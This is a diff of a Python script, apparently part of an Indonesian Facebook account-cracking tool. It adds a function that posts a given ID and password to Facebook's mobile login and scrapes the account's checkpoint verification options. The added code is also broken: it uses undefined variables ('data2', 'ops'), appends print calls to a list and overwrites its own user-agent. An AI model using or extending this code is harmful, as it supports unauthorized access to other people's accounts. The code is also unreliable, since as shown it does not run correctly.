@@ -1695,7 +1695,29 @@ def cek_apk(kuki):
 	except AttributeError:
 		print ("\r    %s \033[0mcookie invalid"%(M))
 
-
+def ceker(idf,pw):
+	sess=requests.Session()
+	data={}
+	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
+	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"ua"})
+	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
+	link=soup.find("form",{"method":"post"})
+	for x in soup("input"):data.update({x.get("name"):x.get("value")})
+	data.update({"email":idf,"pass":pw})
+	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
+	try:
+		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
+		for x in response("input"):
+			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
+		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
+		cek=[cek.text for cek in responses.find_all("option")]
+		if len(cek)==0:pass
+		else:
+			for opsi in range(len(cek)):ops.append(print("[bold white]"+cek[opsi]))
+	except:pass
+	if len(ops)==0:pass
+	print (' [+] Columns(ops)')
+                          
 def ceker1(idf,pw):
 	global cp
 	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
@@ -1783,7 +1805,7 @@ def cek_opsi():
 	exit()
 
 
-def ceker(idf,pw):
+def ceker2(idf,pw):
 	sess=requests.Session()
 	data={}
 	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
